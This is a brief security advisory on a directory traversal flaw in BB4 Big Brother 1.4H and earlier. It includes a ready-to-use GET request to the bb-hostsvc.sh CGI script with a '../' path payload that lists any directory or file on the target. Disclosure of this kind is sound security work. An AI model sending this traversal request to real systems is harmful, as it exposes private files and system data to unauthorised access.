Versions 1.4H and prior of BB4 Big Brother are susceptible to a directory traversal vulnerability which would allow a remote user to view the contents of any directory or file on the system. Executing a GET request for:

http://target/cgi-bin/bb-hostsvc.sh?HOSTSVC=/../../directory

will display the contents of the specified directory.
